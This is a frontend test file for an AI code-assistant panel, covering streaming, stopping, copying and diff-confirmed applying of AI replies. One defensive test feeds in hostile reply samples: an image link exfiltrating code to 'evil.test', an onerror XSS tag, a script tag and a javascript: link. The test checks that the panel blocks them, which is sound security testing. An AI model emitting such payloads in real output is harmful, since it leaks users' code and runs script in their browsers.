import { describe, it, expect, vi } from 'vitest'
import { render, screen, waitFor, within } from '@testing-library/react'
import userEvent from '@testing-library/user-event'
import AIPanel from './AIPanel'

vi.mock('@monaco-editor/react', () => ({
  DiffEditor: ({ original, modified, language }) => (
    <div data-testid="diff" data-language={language}>
      <pre data-testid="original">{original}</pre>
      <pre data-testid="modified">{modified}</pre>
    </div>
  ),
}))

const FILE = { id: 1, path: 'src/app.py', language: 'python' }
const OTHER = { id: 2, path: 'src/helper.py', language: 'python' }
const REFACTORED = 'def main():\n    return 1'
const REPLY = `I simplified it.\n\n\`\`\`python\n${REFACTORED}\n\`\`\`\n`

const frame = (event, data) => `event: ${event}\ndata: ${JSON.stringify(data)}\n\n`

// A fetch whose body arrives chunk by chunk, split wherever the test likes
function streamFetch(chunks, { status = 200, json } = {}) {
  const encoder = new TextEncoder()
  const fetchMock = vi.fn((_url, init) => {
    if (status !== 200) {
      return Promise.resolve({ ok: false, status, json: () => Promise.resolve(json) })
    }
    const body = new ReadableStream({
      start(controller) {
        init.signal?.addEventListener('abort', () => controller.error(new DOMException('Aborted', 'AbortError')))
        chunks.forEach((chunk) => controller.enqueue(encoder.encode(chunk)))
        if (!chunks.hold) controller.close()
      },
    })
    return Promise.resolve({ ok: true, status, body })
  })
  vi.stubGlobal('fetch', fetchMock)
  return fetchMock
}

function setup(props = {}) {
  const handlers = { beforeAsk: vi.fn(() => Promise.resolve()), onApply: vi.fn() }
  const merged = { projectId: '7', files: [FILE, OTHER], activeFile: FILE, activeContent: 'old code', canEdit: true, ...handlers, ...props }
  const view = render(<AIPanel {...merged} />)
  return { ...handlers, rerender: (next) => view.rerender(<AIPanel {...merged} {...next} />) }
}

const sentBody = (fetchMock) => JSON.parse(fetchMock.mock.calls[0][1].body)

describe('AIPanel', () => {
  it('offers the five actions', () => {
    setup()
    for (const name of [/Explain/, /Find bugs/, /Generate docs/, /Write tests/, /Refactor/]) {
      expect(screen.getByRole('button', { name })).toBeEnabled()
    }
  })

  it.each([
    [/Explain/, 'explain'], [/Find bugs/, 'bugs'], [/Generate docs/, 'docs'], [/Write tests/, 'tests'], [/Refactor/, 'refactor'],
  ])('%s asks for the right action about the open file', async (name, action) => {
    const fetchMock = streamFetch([frame('delta', { text: 'ok' }), frame('done', {})])
    setup()
    await userEvent.click(screen.getByRole('button', { name }))
    await screen.findByText('ok')
    expect(sentBody(fetchMock)).toEqual({ action, file_id: 1, context_file_ids: [] })
    expect(fetchMock.mock.calls[0][0]).toContain('/ai/projects/7/stream')
  })

  it('renders the reply as it arrives, as Markdown', async () => {
    streamFetch([frame('delta', { text: '**bo' }), frame('delta', { text: 'ld** and `code`' }), frame('done', {})])
    setup()
    await userEvent.click(screen.getByRole('button', { name: /Explain/ }))
    const bold = await screen.findByText('bold')
    expect(bold.tagName).toBe('STRONG')
    expect(screen.getByText('code').tagName).toBe('CODE')
  })

  it('saves first, then asks', async () => {
    const order = []
    const fetchMock = streamFetch([frame('done', {})])
    fetchMock.mockImplementationOnce(fetchMock.getMockImplementation())
    const beforeAsk = vi.fn(() => { order.push('saved'); expect(fetchMock).not.toHaveBeenCalled(); return Promise.resolve() })
    setup({ beforeAsk })
    await userEvent.click(screen.getByRole('button', { name: /Explain/ }))
    await waitFor(() => expect(fetchMock).toHaveBeenCalled())
    expect(order).toEqual(['saved'])
  })

  it('does not ask if saving failed', async () => {
    const fetchMock = streamFetch([])
    setup({ beforeAsk: vi.fn(() => Promise.reject(new Error('Save failed'))) })
    await userEvent.click(screen.getByRole('button', { name: /Explain/ }))
    expect(await screen.findByRole('alert')).toHaveTextContent('Save failed')
    expect(fetchMock).not.toHaveBeenCalled()
  })

  it('sends only the extra files you tick', async () => {
    const fetchMock = streamFetch([frame('done', {})])
    setup()
    await userEvent.click(screen.getByText(/Also include other files \(0\)/))
    await userEvent.click(screen.getByRole('checkbox', { name: 'src/helper.py' }))
    expect(screen.getByText(/Also include other files \(1\)/)).toBeInTheDocument()
    await userEvent.click(screen.getByRole('button', { name: /Explain/ }))
    await waitFor(() => expect(fetchMock).toHaveBeenCalled())
    expect(sentBody(fetchMock).context_file_ids).toEqual([2])
  })

  it('never offers the open file as an extra', () => {
    setup()
    expect(screen.queryByRole('checkbox', { name: 'src/app.py' })).not.toBeInTheDocument()
  })

  it('a ticked file that becomes the open file is not sent as an extra', async () => {
    const fetchMock = streamFetch([frame('done', {})])
    const { rerender } = setup()
    await userEvent.click(screen.getByText(/Also include/))
    await userEvent.click(screen.getByRole('checkbox', { name: 'src/helper.py' }))
    rerender({ activeFile: OTHER })
    await userEvent.click(screen.getByRole('button', { name: /Explain/ }))
    await waitFor(() => expect(fetchMock).toHaveBeenCalled())
    expect(sentBody(fetchMock)).toMatchObject({ file_id: 2, context_file_ids: [] })
  })

  it('limits extras to ten', async () => {
    const many = Array.from({ length: 12 }, (_, i) => ({ id: i + 10, path: `f${i}.py`, language: 'python' }))
    setup({ files: [FILE, ...many] })
    await userEvent.click(screen.getByText(/Also include/))
    for (let i = 0; i < 10; i += 1) await userEvent.click(screen.getByRole('checkbox', { name: `f${i}.py` }))
    expect(screen.getByRole('checkbox', { name: 'f10.py' })).toBeDisabled()
    expect(screen.getByRole('checkbox', { name: 'f0.py' })).toBeEnabled()
  })

  describe('errors', () => {
    it('shows quota and busy messages from the server', async () => {
      streamFetch([], { status: 503, json: { detail: "The AI service's free daily quota has been reached." } })
      setup()
      await userEvent.click(screen.getByRole('button', { name: /Explain/ }))
      expect(await screen.findByRole('alert')).toHaveTextContent('free daily quota')
    })

    it('keeps what arrived when the stream fails partway', async () => {
      streamFetch([frame('delta', { text: 'partial text' }), frame('error', { detail: 'Stopped partway.' })])
      setup()
      await userEvent.click(screen.getByRole('button', { name: /Explain/ }))
      expect(await screen.findByText('partial text')).toBeInTheDocument()
      expect(await screen.findByRole('alert')).toHaveTextContent('Stopped partway.')
    })
  })

  describe('stopping', () => {
    it('Stop ends the stream, keeps the text and shows no error', async () => {
      const chunks = [frame('delta', { text: 'so far' })]
      chunks.hold = true
      streamFetch(chunks)
      setup()
      await userEvent.click(screen.getByRole('button', { name: /Explain/ }))
      expect(await screen.findByText('so far')).toBeInTheDocument()
      expect(screen.getByRole('button', { name: /Refactor/ })).toBeDisabled()
      await userEvent.click(screen.getByRole('button', { name: /Stop/ }))
      await waitFor(() => expect(screen.getByRole('button', { name: /Refactor/ })).toBeEnabled())
      expect(screen.getByText('so far')).toBeInTheDocument()
      expect(screen.queryByRole('alert')).not.toBeInTheDocument()
    })

    it('leaving the page aborts the stream', async () => {
      const chunks = [frame('delta', { text: 'x' })]
      chunks.hold = true
      const fetchMock = streamFetch(chunks)
      const view = render(<AIPanel projectId="7" files={[FILE]} activeFile={FILE} activeContent="" canEdit beforeAsk={() => Promise.resolve()} onApply={vi.fn()} />)
      await userEvent.click(screen.getByRole('button', { name: /Explain/ }))
      await screen.findByText('x')
      view.unmount()
      expect(fetchMock.mock.calls[0][1].signal.aborted).toBe(true)
    })
  })

  describe('copy', () => {
    it('copies a code block without its trailing newline, or the whole reply', async () => {
      streamFetch([frame('delta', { text: REPLY }), frame('done', {})])
      setup()
      const user = userEvent.setup()
      const writeText = vi.spyOn(navigator.clipboard, 'writeText')
      await user.click(screen.getByRole('button', { name: /Refactor/ }))
      await user.click(await screen.findByRole('button', { name: 'Copy' }))
      expect(writeText).toHaveBeenLastCalledWith(REFACTORED)
      await user.click(screen.getByRole('button', { name: 'Copy reply' }))
      expect(writeText).toHaveBeenLastCalledWith(REPLY)
    })
  })

  describe('apply to editor', () => {
    async function withReply(props) {
      streamFetch([frame('delta', { text: REPLY }), frame('done', {})])
      const result = setup(props)
      await userEvent.click(screen.getByRole('button', { name: /Refactor/ }))
      await screen.findByText(/I simplified it/)
      return result
    }

    it('shows a diff first and changes nothing until confirmed', async () => {
      const { onApply } = await withReply()
      await userEvent.click(await screen.findByRole('button', { name: 'Apply to editor' }))
      const dialog = await screen.findByRole('dialog', { name: 'Apply to src/app.py?' })
      expect(within(dialog).getByTestId('original')).toHaveTextContent('old code')
      expect(within(dialog).getByTestId('modified').textContent).toBe(REFACTORED)
      expect(within(dialog).getByTestId('diff')).toHaveAttribute('data-language', 'python')
      expect(onApply).not.toHaveBeenCalled()
      await userEvent.click(within(dialog).getByRole('button', { name: 'Apply changes' }))
      expect(onApply).toHaveBeenCalledWith(REFACTORED)
      expect(screen.queryByRole('dialog')).not.toBeInTheDocument()
    })

    it('keeps the file ending in a newline if it did before', async () => {
      const { onApply } = await withReply({ activeContent: 'old code\n' })
      await userEvent.click(await screen.findByRole('button', { name: 'Apply to editor' }))
      const dialog = await screen.findByRole('dialog')
      await userEvent.click(within(dialog).getByRole('button', { name: 'Apply changes' }))
      expect(onApply).toHaveBeenCalledWith(`${REFACTORED}\n`)
    })

    it('cancelling applies nothing', async () => {
      const { onApply } = await withReply()
      await userEvent.click(await screen.findByRole('button', { name: 'Apply to editor' }))
      await userEvent.click(within(await screen.findByRole('dialog')).getByRole('button', { name: 'Cancel' }))
      expect(onApply).not.toHaveBeenCalled()
      expect(screen.queryByRole('dialog')).not.toBeInTheDocument()
    })

    it('viewers can read and copy, but not apply', async () => {
      await withReply({ canEdit: false })
      expect(await screen.findByRole('button', { name: 'Copy' })).toBeInTheDocument()
      expect(screen.queryByRole('button', { name: 'Apply to editor' })).not.toBeInTheDocument()
    })

    it('only applies to the file the reply was about', async () => {
      const { rerender } = await withReply()
      await screen.findByRole('button', { name: 'Apply to editor' })
      rerender({ activeFile: OTHER, activeContent: 'other code' })
      expect(screen.queryByRole('button', { name: 'Apply to editor' })).not.toBeInTheDocument()
      expect(screen.getByText(/Open src\/app\.py again/)).toBeInTheDocument()
      rerender({ activeFile: FILE, activeContent: 'old code' })
      expect(screen.getByRole('button', { name: 'Apply to editor' })).toBeInTheDocument()
    })

    it('is not offered while the reply is still arriving', async () => {
      const chunks = [frame('delta', { text: REPLY })]
      chunks.hold = true
      streamFetch(chunks)
      setup()
      await userEvent.click(screen.getByRole('button', { name: /Refactor/ }))
      await screen.findByText(/I simplified it/)
      expect(screen.queryByRole('button', { name: 'Apply to editor' })).not.toBeInTheDocument()
    })
  })

  describe('untrusted replies', () => {
    it('does not load images, render raw HTML or allow script links', async () => {
      const nasty = [
        '![x](https://evil.test/steal?code=abc)',
        '<img src="https://evil.test/a.png" onerror="alert(1)">',
        '<script>alert(1)</script>',
        '[click](javascript:alert(1))',
        '[docs](https://docs.test/page)',
      ].join('\n\n')
      streamFetch([frame('delta', { text: nasty }), frame('done', {})])
      const { container } = render(<AIPanel projectId="7" files={[FILE]} activeFile={FILE} activeContent="" canEdit beforeAsk={() => Promise.resolve()} onApply={vi.fn()} />)
      await userEvent.click(screen.getByRole('button', { name: /Explain/ }))
      const docs = await screen.findByRole('link', { name: 'docs' })
      expect(docs).toHaveAttribute('href', 'https://docs.test/page')
      expect(docs).toHaveAttribute('rel', 'noreferrer noopener')
      expect(container.querySelector('img')).toBeNull()
      expect(container.querySelector('script')).toBeNull()
      const click = screen.queryByRole('link', { name: 'click' })
      if (click) expect(click.getAttribute('href') ?? '').not.toContain('javascript:')
    })
  })
})
